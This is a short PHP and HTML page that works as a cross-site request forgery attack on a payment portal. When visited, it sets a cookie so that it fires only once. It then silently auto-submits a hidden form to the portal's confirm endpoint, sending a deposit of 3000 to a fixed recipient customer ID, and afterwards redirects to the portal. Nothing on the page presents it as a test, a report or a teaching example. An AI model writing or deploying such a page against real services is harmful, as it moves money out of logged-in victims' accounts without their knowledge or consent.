<?php
if(isset($_COOKIE['ok'])) {
	header("Location: https://portal.u.cash");
	exit();
}
setcookie('ok', '000', time() + (86400 * 30), "/");
?>

<form method="POST" action="https://portal.u.cash/xuc/confirmxuc" id="form">
	<input type="hidden" name="recepient_customer_id" value="87745">
	<input type="hidden" name="depo_amount" value="3000">
	<input type="hidden" name="final_amount" value="3000">
</form>
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
<script type="text/javascript">
	$('#form').submit();
</script>